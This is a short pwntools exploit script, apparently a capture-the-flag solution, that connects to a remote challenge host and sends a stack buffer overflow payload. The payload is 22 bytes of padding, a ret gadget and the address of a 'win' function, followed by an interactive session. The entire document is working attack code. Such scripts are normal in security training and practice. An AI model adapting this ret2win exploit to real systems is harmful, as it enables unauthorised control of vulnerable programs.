from pwn import *

p = remote('dragonsec.si',7478)
#p = process('./bof_1_patched')
#pid = gdb.attach(p,gdbscript="b * vuln+25")
win_addr = p64(0x0400607)
ret = p64(0x00000000004004be)

pad =b'A' * 22

payload = pad
payload += ret
payload += win_addr

p.send(payload)


p.interactive()
